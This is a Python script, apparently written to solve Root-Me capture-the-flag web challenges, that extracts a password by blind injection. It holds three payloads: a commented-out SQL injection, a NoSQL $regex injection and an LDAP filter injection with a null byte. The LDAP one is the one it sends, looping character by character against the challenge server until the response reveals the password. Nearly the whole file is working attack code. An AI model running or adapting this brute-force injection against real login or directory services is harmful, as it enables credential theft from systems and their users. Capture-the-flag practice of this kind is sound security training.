import http.client, urllib.request, urllib.parse, urllib.error
import sys
import string

MSG_OK = "admin"
MSG_ERROR = "not a valid flag"

def go(passwd):
  # params = urllib.parse.urlencode(
  #   {
  #     'username': "admin' and password like '%" + passwd + "' -- ",
  #     # "username": 'admin',
  #     "password": passwd
  #   })
  # headers = {"Content-type": "application/x-www-form-urlencoded",
  #       "Accept": "text/plain"}

  base_url = "/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]="
  final_url = base_url + passwd + ".*$"

  base_url2 = "/web-serveur/ch26/?action=dir&search=admin@ch2*)(password="
  final_url2 = base_url2 + passwd + "*))%00"

  conn = http.client.HTTPConnection("challenge01.root-me.org")
  conn.request("GET", final_url2)
  response = conn.getresponse()
  data = response.read()
  data = data.decode('utf-8')
  conn.close()
  # print(type(MSG_OK))
  if MSG_OK in data:
    return True
  else:
    return False
  # if MSG_ERROR in data:
  #   return False
  return None

passwd = ""
char = string.ascii_letters + string.digits + "_/.,!@#$^&+()_-+[]{};`:\"\\<>/?|"

# e2azo93i
# passwd = [['e', 'E'], ['2'], ['a', 'A'], ['z', 'Z'], ['o', 'O'], ['9'], ['3'], ['i', 'I']]
# def x(cur, lst):
#   if len(lst) == 0:
#     print(cur, go(cur))
#     return

#   for o in lst[0]:
#     x(cur + o, lst[1:])

# x("", passwd)

while True:
  for ch in char:
    res = go(passwd + ch)
    if res is True:
      passwd = passwd + ch
      # print(passwd, flush=True, end='')
      print(passwd)
      sys.stdout.flush()
      break

    if res is False:
      print(".", flush=True, end='')
      # sys.stdout.write(".")
      # sys.stdout.flush()
      continue

    print("None returned")
  # print(passwd)
print("Final password is: " + passwd)